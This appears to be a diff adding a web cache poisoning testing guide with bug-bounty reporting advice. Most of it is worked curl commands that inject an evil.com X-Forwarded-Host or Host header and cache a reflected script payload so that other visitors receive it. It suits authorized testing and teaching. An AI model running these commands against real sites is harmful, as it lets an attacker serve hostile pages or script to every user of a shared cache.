@@ -1,0 +1,48 @@
+# HOW TO TEST WEB CACHE POISONING ON A TARGET (2026 expert guide)
+
+## The N ways to test
+1. Unkeyed header affecting rendering: X-Forwarded-Host, X-Host, X-Forwarded-Cache-Only,
+   X-Forwarded-For, X-Original-URL, X-Rewrite-URL, x-forwarded-proto (response URLs/cookies).
+2. Unkeyed query param that changes output but not the cache key (utm=..., callback=, _=...).
+3. Normalization mismatch (path /x vs //x, %2f, ;param) - two ways hit same render, one not cached.
+4. Vary/ignore mismatch ("Vary: X-Forwarded-Host" present vs actual).
+5. Response "Cache-Control: public, s-maxage=..." + a stale-key collision -> you poison for the group.
+6. XSS via poisoned cached asset (cached script tag ref, cookie reflection): the highest.
+7. Host-header cache poisoning: if cached response reflects Host (or XFH) -> all users get attacker page.
+8. Recursive gets: send one poisoned, users hitting the SAME key get attacker-owned payload.
+
+## Step-by-step on target
+1. Map the caching: add a dummy value that returns to the page and see if header-order matters:
+   curl -H "X-Collaborator-Uniq: 123" -D - ; if next curl WITHOUT header returns same body = cached.
+2. Test unkeyed params: find one the app echoes (or that triggers a redirect) -> pollute.
+3. If X-Forwarded-Host reflected in URL builders or <link> = the whole site is poisonable: set to YOUR-COLLABORATOR/evil.com, get body cached, verify a second plain request gets your value.
+4. Confirm the poisoned artifact: 2nd+ request to the SAME URL (distinct user identity) shows your injected value.
+5. Timing / header-based: Host: evil.com + no user identity -> cache it -> EVERYONE gets evil.com; report High/Critical.
+
+## Worked examples (concrete)
+# cache presence check:
+curl -si "https://target.com/" -H "X-Cache: test" | head -30        # then no header -> same content? cached
+curl -si "https://target.com/?_=1" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"
+# unkeyed param echo:
+curl -si "https://target.com/?utm_source=UNIQME" | grep UNIQME      # is utm echoed into a script/iframe?
+# poison with XFH (if honored):
+curl -si "https://target.com/" -H "X-Forwarded-Host: evil.com" 
+#   -> second clean request to / returns the evil.com page (if cache key lacks that header).
+# X-Forwarded-Proto flip:
+curl -si "https://target.com/" -H "X-Forwarded-Proto: http" | grep -i "https://...target.com"
+#   -> if it renders http:// links or mixed content, cache that for CSP bypass/XSS-adjacent.
+# XSS via cached parameter (common in static search): 
+curl -si "https://target.com/search?q=<script>alert(document.domain)</script>"   # if reflected AND cached
+# craft the cache key collision:
+#   https://target.com/x -> renderer A
+#   https://target.com//x -> renderer A but cache key perceives /x -> poison the second, reuse first.
+#   (Burp accepts //x as different while cache may strip) verify with the X-Cache header.
+
+## False positives
+- Response shows YOUR header only because it wasn't cached yet - you must re-request with a 2ND identity/agent.
+- If "Cache-Control: no-store" / private -> nothing to poison.
+- A reflected param that DOESN'T reach the cache (private per-user) = no bug.
+
+## Reporting
+- Deliver: request1(poison), request2(clean consumer) and show the poisoned body persists for the victim.
+- Include impact: XSS-on-cached-resource = Critical; mixed-content/redirect dir = Medium/High.
